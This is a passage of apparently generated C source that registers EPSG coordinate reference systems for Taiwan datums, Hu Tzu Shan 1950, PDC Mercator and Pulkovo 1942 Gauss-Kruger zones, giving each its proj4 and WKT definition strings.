3,\n        \"83,0.853,-3.408],AUTHORITY[\\\"EPSG\\\",\\\"1024\\\"]],PRIMEM[\\\"\");\n    add_srs_wkt (p, 4,\n        \"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degre\");\n    add_srs_wkt (p, 5,\n        \"e\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUT\");\n    add_srs_wkt (p, 6,\n        \"HORITY[\\\"EPSG\\\",\\\"3819\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3821, \"epsg\", 3821,\n        \"TWD67\");\n    add_proj4text (p, 0,\n        \"+proj=longlat +ellps=aust_SA +no_defs\");\n    add_srs_wkt (p, 0,\n        \"GEOGCS[\\\"TWD67\\\",DATUM[\\\"Taiwan_Datum_1967\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 1,\n        \"GRS 1967 Modified\\\",6378160,298.25,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 2,\n        \"7050\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"1025\\\"]],PRIMEM[\\\"Greenwic\");\n    add_srs_wkt (p, 3,\n        \"h\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.01\");\n    add_srs_wkt (p, 4,\n        \"74532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"\");\n    add_srs_wkt (p, 5,\n        \"EPSG\\\",\\\"3821\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3824, \"epsg\", 3824,\n        \"TWD97\");\n    add_proj4text (p, 0,\n        \"+proj=longlat +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +no_de\");\n    add_proj4text (p, 1,\n        \"fs\");\n    add_srs_wkt (p, 0,\n        \"GEOGCS[\\\"TWD97\\\",DATUM[\\\"Taiwan_Datum_1997\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 1,\n        \"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"70\");\n    add_srs_wkt (p, 2,\n        \"19\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"1026\\\"\");\n    add_srs_wkt (p, 3,\n        \"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],\");\n    add_srs_wkt (p, 4,\n        \"UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 5,\n        \"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"3824\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3825, \"epsg\", 3825,\n        \"TWD97 / TM2 zone 119\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=119 +k=0.9999 +x_0=250000 +y\");\n    add_proj4text (p, 1,\n        \"_0=0 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_de\");\n    add_proj4text (p, 2,\n        \"fs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"TWD97 / TM2 zone 119\\\",GEOGCS[\\\"TWD97\\\",DATUM[\\\"\");\n    add_srs_wkt (p, 1,\n        \"Taiwan_Datum_1997\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.25\");\n    add_srs_wkt (p, 2,\n        \"7222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,\");\n    add_srs_wkt (p, 3,\n        \"0,0],AUTHORITY[\\\"EPSG\\\",\\\"1026\\\"]],PRIMEM[\\\"Greenwich\\\",\");\n    add_srs_wkt (p, 4,\n        \"0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.017453\");\n    add_srs_wkt (p, 5,\n        \"2925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 6,\n        \"G\\\",\\\"3824\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARAM\");\n    add_srs_wkt (p, 7,\n        \"ETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"central_merid\");\n    add_srs_wkt (p, 8,\n        \"ian\\\",119],PARAMETER[\\\"scale_factor\\\",0.9999],PARAMETER[\");\n    add_srs_wkt (p, 9,\n        \"\\\"false_easting\\\",250000],PARAMETER[\\\"false_northing\\\",0\");\n    add_srs_wkt (p, 10,\n        \"],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"\");\n    add_srs_wkt (p, 11,\n        \"X\\\",EAST],AXIS[\\\"Y\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3825\\\"]\");\n    add_srs_wkt (p, 12,\n        \"]\");\n    p = add_epsg_def (filter, first, last, 3826, \"epsg\", 3826,\n        \"TWD97 / TM2 zone 121\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=121 +k=0.9999 +x_0=250000 +y\");\n    add_proj4text (p, 1,\n        \"_0=0 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_de\");\n    add_proj4text (p, 2,\n        \"fs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"TWD97 / TM2 zone 121\\\",GEOGCS[\\\"TWD97\\\",DATUM[\\\"\");\n    add_srs_wkt (p, 1,\n        \"Taiwan_Datum_1997\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.25\");\n    add_srs_wkt (p, 2,\n        \"7222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,\");\n    add_srs_wkt (p, 3,\n        \"0,0],AUTHORITY[\\\"EPSG\\\",\\\"1026\\\"]],PRIMEM[\\\"Greenwich\\\",\");\n    add_srs_wkt (p, 4,\n        \"0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.017453\");\n    add_srs_wkt (p, 5,\n        \"2925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 6,\n        \"G\\\",\\\"3824\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARAM\");\n    add_srs_wkt (p, 7,\n        \"ETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"central_merid\");\n    add_srs_wkt (p, 8,\n        \"ian\\\",121],PARAMETER[\\\"scale_factor\\\",0.9999],PARAMETER[\");\n    add_srs_wkt (p, 9,\n        \"\\\"false_easting\\\",250000],PARAMETER[\\\"false_northing\\\",0\");\n    add_srs_wkt (p, 10,\n        \"],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"\");\n    add_srs_wkt (p, 11,\n        \"X\\\",EAST],AXIS[\\\"Y\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3826\\\"]\");\n    add_srs_wkt (p, 12,\n        \"]\");\n    p = add_epsg_def (filter, first, last, 3827, \"epsg\", 3827,\n        \"TWD67 / TM2 zone 119\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=119 +k=0.9999 +x_0=250000 +y\");\n    add_proj4text (p, 1,\n        \"_0=0 +ellps=aust_SA +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"TWD67 / TM2 zone 119\\\",GEOGCS[\\\"TWD67\\\",DATUM[\\\"\");\n    add_srs_wkt (p, 1,\n        \"Taiwan_Datum_1967\\\",SPHEROID[\\\"GRS 1967 Modified\\\",63781\");\n    add_srs_wkt (p, 2,\n        \"60,298.25,AUTHORITY[\\\"EPSG\\\",\\\"7050\\\"]],AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 3,\n        \"\\\",\\\"1025\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 4,\n        \"\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\");\n    add_srs_wkt (p, 5,\n        \"\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"3821\\\"]],PROJEC\");\n    add_srs_wkt (p, 6,\n        \"TION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_or\");\n    add_srs_wkt (p, 7,\n        \"igin\\\",0],PARAMETER[\\\"central_meridian\\\",119],PARAMETER[\");\n    add_srs_wkt (p, 8,\n        \"\\\"scale_factor\\\",0.9999],PARAMETER[\\\"false_easting\\\",250\");\n    add_srs_wkt (p, 9,\n        \"000],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AU\");\n    add_srs_wkt (p, 10,\n        \"THORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",\");\n    add_srs_wkt (p, 11,\n        \"NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3827\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3828, \"epsg\", 3828,\n        \"TWD67 / TM2 zone 121\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=121 +k=0.9999 +x_0=250000 +y\");\n    add_proj4text (p, 1,\n        \"_0=0 +ellps=aust_SA +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"TWD67 / TM2 zone 121\\\",GEOGCS[\\\"TWD67\\\",DATUM[\\\"\");\n    add_srs_wkt (p, 1,\n        \"Taiwan_Datum_1967\\\",SPHEROID[\\\"GRS 1967 Modified\\\",63781\");\n    add_srs_wkt (p, 2,\n        \"60,298.25,AUTHORITY[\\\"EPSG\\\",\\\"7050\\\"]],AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 3,\n        \"\\\",\\\"1025\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 4,\n        \"\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\");\n    add_srs_wkt (p, 5,\n        \"\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"3821\\\"]],PROJEC\");\n    add_srs_wkt (p, 6,\n        \"TION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_or\");\n    add_srs_wkt (p, 7,\n        \"igin\\\",0],PARAMETER[\\\"central_meridian\\\",121],PARAMETER[\");\n    add_srs_wkt (p, 8,\n        \"\\\"scale_factor\\\",0.9999],PARAMETER[\\\"false_easting\\\",250\");\n    add_srs_wkt (p, 9,\n        \"000],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AU\");\n    add_srs_wkt (p, 10,\n        \"THORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",\");\n    add_srs_wkt (p, 11,\n        \"NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3828\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3829, \"epsg\", 3829,\n        \"Hu Tzu Shan 1950 / UTM zone 51N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=51 +ellps=intl +towgs84=-637,-549,-203,0\");\n    add_proj4text (p, 1,\n        \",0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Hu Tzu Shan 1950 / UTM zone 51N\\\",GEOGCS[\\\"Hu T\");\n    add_srs_wkt (p, 1,\n        \"zu Shan 1950\\\",DATUM[\\\"Hu_Tzu_Shan_1950\\\",SPHEROID[\\\"Int\");\n    add_srs_wkt (p, 2,\n        \"ernational 1924\\\",6378388,297,AUTHORITY[\\\"EPSG\\\",\\\"7022\\\"\");\n    add_srs_wkt (p, 3,\n        \"]],TOWGS84[-637,-549,-203,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 4,\n        \"6236\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"890\");\n    add_srs_wkt (p, 5,\n        \"1\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 6,\n        \"G\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4236\\\"]],PROJECTION[\");\n    add_srs_wkt (p, 7,\n        \"\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\"\");\n    add_srs_wkt (p, 8,\n        \",0],PARAMETER[\\\"central_meridian\\\",123],PARAMETER[\\\"scal\");\n    add_srs_wkt (p, 9,\n        \"e_factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],P\");\n    add_srs_wkt (p, 10,\n        \"ARAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORIT\");\n    add_srs_wkt (p, 11,\n        \"Y[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Nort\");\n    add_srs_wkt (p, 12,\n        \"hing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3829\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3832, \"epsg\", 3832,\n        \"WGS 84 / PDC Mercator\");\n    add_proj4text (p, 0,\n        \"+proj=merc +lon_0=150 +k=1 +x_0=0 +y_0=0 +datum=WGS84 +u\");\n    add_proj4text (p, 1,\n        \"nits=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 84 / PDC Mercator\\\",GEOGCS[\\\"WGS 84\\\",DATUM\");\n    add_srs_wkt (p, 1,\n        \"[\\\"WGS_1984\\\",SPHEROID[\\\"WGS 84\\\",6378137,298.257223563,\");\n    add_srs_wkt (p, 2,\n        \"AUTHORITY[\\\"EPSG\\\",\\\"7030\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"6326\\\"\");\n    add_srs_wkt (p, 3,\n        \"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],\");\n    add_srs_wkt (p, 4,\n        \"UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 5,\n        \"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4326\\\"]],PROJECTION[\\\"Merc\");\n    add_srs_wkt (p, 6,\n        \"ator_1SP\\\"],PARAMETER[\\\"central_meridian\\\",150],PARAMETE\");\n    add_srs_wkt (p, 7,\n        \"R[\\\"scale_factor\\\",1],PARAMETER[\\\"false_easting\\\",0],PAR\");\n    add_srs_wkt (p, 8,\n        \"AMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\");\n    add_srs_wkt (p, 9,\n        \"\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northi\");\n    add_srs_wkt (p, 10,\n        \"ng\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3832\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3833, \"epsg\", 3833,\n        \"Pulkovo 1942(58) / Gauss-Kruger zone 2\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=9 +k=1 +x_0=2500000 +y_0=0 +\");\n    add_proj4text (p, 1,\n        \"ellps=krass +towgs84=33.4,-146.6,-76.3,-0.359,-0.053,0.8\");\n    add_proj4text (p, 2,\n        \"44,-0.84 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pulkovo 1942(58) / Gauss-Kruger zone 2\\\",GEOGCS\");\n    add_srs_wkt (p, 1,\n        \"[\\\"Pulkovo 1942(58)\\\",DATUM[\\\"Pulkovo_1942_58\\\",SPHEROID\");\n    add_srs_wkt (p, 2,\n        \"[\\\"Krassowsky 1940\\\",6378245,298.3,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 3,\n        \"7024\\\"]],TOWGS84[33.4,-146.6,-76.3,-0.359,-0.053,0.844,-\");\n    add_srs_wkt (p, 4,\n        \"0.84],AUTHORITY[\\\"EPSG\\\",\\\"6179\\\"]],PRIMEM[\\\"Greenwich\\\"\");\n    add_srs_wkt (p, 5,\n        \",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.01745\");\n    add_srs_wkt (p, 6,\n        \"32925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EP\");\n    add_srs_wkt (p, 7,\n        \"SG\\\",\\\"4179\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARA\");\n    add_srs_wkt (p, 8,\n        \"METER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"central_meri\");\n    add_srs_wkt (p, 9,\n        \"dian\\\",9],PARAMETER[\\\"scale_factor\\\",1],PARAMETER[\\\"fals\");\n    add_srs_wkt (p, 10,\n        \"e_easting\\\",2500000],PARAMETER[\\\"false_northing\\\",0],UNI\");\n    add_srs_wkt (p, 11,\n        \"T[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",N\");\n    add_srs_wkt (p, 12,\n        \"ORTH],AXIS[\\\"Y\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3833\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3834, \"epsg\", 3834,\n        \"Pulkovo 1942(83) / Gauss-Kruger zone 2\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=9 +k=1 +x_0=2500000 +y_0=0 +\");\n    add_proj4text (p, 1,\n        \"ellps=krass +towgs84=26,-121,-78,0,0,0,0 +units=m +no_de\");\n    add_proj4text (p, 2,\n        \"fs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pulkovo 1942(83) / Gauss-Kruger zone 2\\\",GEOGCS\");\n    add_srs_wkt (p, 1,\n        \"[\\\"Pulkovo 1942(83)\\\",DATUM[\\\"Pulkovo_1942_83\\\",SPHEROID\");\n    add_srs_wkt (p, 2,\n        \"[\\\"Krassowsky 1940\\\",6378245,298.3,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 3,\n        \"7024\\\"]],TOWGS84[26,-121,-78,0,0,0,0],AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 4,\n        \",\\\"6178\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 5,\n        \"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 6,\n        \"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4178\\\"]],PROJECTI\");\n    add_srs_wkt (p, 7,\n        \"ON[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_orig\");\n    add_srs_wkt (p, 8,\n        \"in\\\",0],PARAMETER[\\\"central_meridian\\\",9],PARAMETER[\\\"sc\");\n    add_srs_wkt (p, 9,\n        \"ale_factor\\\",1],PARAMETER[\\\"false_easting\\\",2500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\");\n    add_srs_wkt (p, 11,\n        \"\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NORTH],AXIS[\\\"Y\\\",EAST],A\");\n    add_srs_wkt (p, 12,\n        \"UTHORITY[\\\"EPSG\\\",\\\"3834\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3835, \"epsg\", 3835,\n        \"Pulkovo 1942(83) / Gauss-Kruger zone 3\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=15 +k=1 +x_0=3500000 +y_0=0 \");\n    add_proj4text (p, 1,\n        \"+ellps=krass +towgs84=26,-121,-78,0,0,0,0 +units=m +no_d\");\n    add_proj4text (p, 2,\n        \"efs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pulkovo 1942(83) / Gauss-Kruger zone 3\\\",GEOGCS\");\n    add_srs_wkt (p, 1,\n        \"[\\\"Pulkovo 1942(83)\\\",DATUM[\\\"Pulkovo_1942_83\\\",SPHEROID\");\n    add_srs_wkt (p, 2,\n        \"[\\\"Krassowsky 1940\\\",6378245,298.3,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 3,\n        \"7024\\\"]],TOWGS84[26,-121,-78,0,0,0,0],AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 4,\n        \",\\\"6178\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 5,\n        \"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 6,\n        \"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4178\\\"]],PROJECTI\");\n    add_srs_wkt (p, 7,\n        \"ON[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_orig\");\n    add_srs_wkt (p, 8,\n        \"in\\\",0],PARAMETER[\\\"central_meridian\\\",15],PARAMETER[\\\"s\");\n    add_srs_wkt (p, 9,\n        \"cale_factor\\\",1],PARAMETER[\\\"false_easting\\\",3500000],PA\");\n    add_srs_wkt (p, 10,\n        \"RAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY\");\n    add_srs_wkt (p, 11,\n        \"[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NORTH],AXIS[\\\"Y\\\",EAST],\");\n    add_srs_wkt (p, 12,\n        \"AUTHORITY[\\\"EPSG\\\",\\\"3835\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3836, \"epsg\", 3836,\n        \"Pulkovo 1942(83) / Gauss-Kruger zone 4\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=21 +k=1 +x_0=4500000 +y_0=0 \");\n    add_proj4text (p, 1,\n        \"+ellps=krass +towgs84=26,-121,-78,0,0,0,0 +units=m +no_d\");\n    add_proj4text (p, 2,\n        \"efs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pulkovo 1942(83) / Gauss-Kruger zone 4\\\",GEOGCS\");\n    add_srs_wkt (p, 1,\n        \"[\\\"Pulkovo 1942(83)\\\",DATUM[\\\"Pulkovo_1942_83\\\",SPHEROID\");\n    add_srs_wkt (p, 2,\n        \"[\\\"Krassowsky 1940\\\",6378245,298.3,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 3,\n        \"7024\\\"]],TOWGS84[26,-121,-78,0,0,0,0],AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 4,\n        \",\\\"6178\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 5,\n        \"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 6,\n        \"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4178\\\"]],PROJECTI\");\n    add_srs_wkt (p, 7,\n        \"ON[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_orig\");\n    add_srs_wkt (p, 8,\n        \"in\\\",0],PARAMETER[\\\"central_meridian\\\",21],PARAMETER[\\\"s\");\n    add_srs_wkt (p, 9,\n        \"cale_factor\\\",1],PARAMETER[\\\"false_easting\\\",4500000],PA\");\n    add_srs_wkt (p, 10,\n        \"RAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY\");\n    add_srs_wkt (p, 11,\n        \"[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NORTH],AXIS[\\\"Y\\\",EAST],\");\n    add_srs_wkt (p, 12,\n        \"AUTHORITY[\\\"EPSG\\\",\\\"3836\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3837, \"epsg\", 3837,\n        \"Pulkovo 1942(58) / 3-degree Gauss-Kruger zone 3\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=9 +k=1 +x_0=3500000 +y_0=0 +\");\n    add_proj4text (p, 1,\n        \"ellps=krass +towgs84=33.4,-146.6,-76.3,-0.359,-0.053,0.8\");\n    add_proj4text (p, 2,\n        \"44,-0.84 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pulkovo 1942(58) / 3-degree Gauss-Kruger zone 3\");\n    add_srs_wkt (p, 1,\n        \"\\\",GEOGCS[\\\"Pulkovo 1942(58)\\\",DATUM[\\\"Pulkovo_1942_58\\\"\");\n    add_srs_wkt (p, 2,\n        \",SPHEROID[\\\"Krassowsky 1940\\\",6378245,298.3,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"7024\\\"]],TOWGS84[33.4,-146.6,-76.3,-0.359,-0.05\");\n    add_srs_wkt (p, 4,\n        \"3,0.844,-0.84],AUTHORITY[\\\"EPSG\\\",\\\"6179\\\"]],PRIMEM[\\\"Gr\");\n    add_srs_wkt (p, 5,\n        \"eenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\"\");\n    add_srs_wkt (p, 6,\n        \",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHOR\");\n    add_srs_wkt (p, 7,\n        \"ITY[\\\"EPSG\\\",\\\"4179\\\"]],PROJECTION[\\\"Transverse_Mercator\");\n    add_srs_wkt (p, 8,\n        \"\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"cent\");\n    add_srs_wkt (p, 9,\n        \"ral_meridian\\\",9],PARAMETER[\\\"scale_factor\\\",1],PARAMETE\");\n    add_srs_wkt (p, 10,\n        \"R[\\\"false_easting\\\",3500000],PARAMETER[\\\"false_northing\\\"\");\n    add_srs_wkt (p, 11,\n        \",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\");\n    add_srs_wkt (p, 12,\n        \"\\\"X\\\",NORTH],AXIS[\\\"Y\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3837\\\"\");\n    add_srs_wkt (p, 13,\n        \"]]\");\n    p = add_epsg_def (filter, first, last, 3838, \"epsg\", 3838,\n        \"Pulkovo 1942(58) / 3-degree Gauss-Kruger zone 4\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=12 +k=1 +x_0=4500000 +y_0=0 \");\n    add_proj4text (p, 1,\n        \"+ellps=krass +towgs84=33.4,-146.6,-76.3,-0.359,-0.053,0.\");\n    add_proj4text (p, 2,\n        \"844,-0.84 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pulkovo 1942(58) / 3-degree Gauss-Kruger zone 4\");\n    add_srs_wkt (p, 1,\n        \"\\\",GEOGCS[\\\"Pulkovo 1942(58)\\\",DATUM[\\\"Pulkovo_1942_58\\\"\");\n    add_srs_wkt (p, 2,\n        \",SPHEROID[\\\"Krassowsky 1940\\\",6378245,298.3,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"7024\\\"]],TOWGS84[33.4,-146.6,-76.3,-0.359,-0.05\");\n    add_srs_wkt (p, 4,\n        \"3,0.844,-0.84],AUTHORITY[\\\"EPSG\\\",\\\"6179\\\"]],PRIMEM[\\\"Gr\");\n    add_srs_wkt (p, 5,\n        \"eenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\"\");\n    add_srs_wkt (p, 6,\n        \",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHOR\");\n    add_srs_wkt (p, 7,\n        \"ITY[\\\"EPSG\\\",\\\"4179\\\"]],PROJECTION[\\\"Transverse_Mercator\");\n    add_srs_wkt (p, 8,\n        \"\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"cent\");\n    add_srs_wkt (p, 9,\n        \"ral_meridian\\\",12],PARAMETER[\\\"scale_factor\\\",1],PARAMET\");\n    add_srs_wkt (p, 10,\n        \"ER[\\\"false_easting\\\",4500000],PARAMETER[\\\"false_northing\");\n    add_srs_wkt (p, 11,\n        \"\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXI\");\n    add_srs_wkt (p, 12,\n        \"S[\\\"X\\\",NORTH],AXIS[\\\"Y\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"383\");\n    add_srs_wkt (p, 13,\n        \"8\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3839, \"epsg\", 3839,\n        \"Pulkovo 1942(58) / 3-degree Gauss-Kruger zone 9\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=27 +k=1 +x_0=9500000 +y_0=0 \");\n    add_proj4text (p, 1,\n        \"+ellps=krass +towgs84=33.4,-146.6,-76.3,-0.359,-0.053,0.\");\n    add_proj4text (p, 2,\n        \"844,-0.84 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        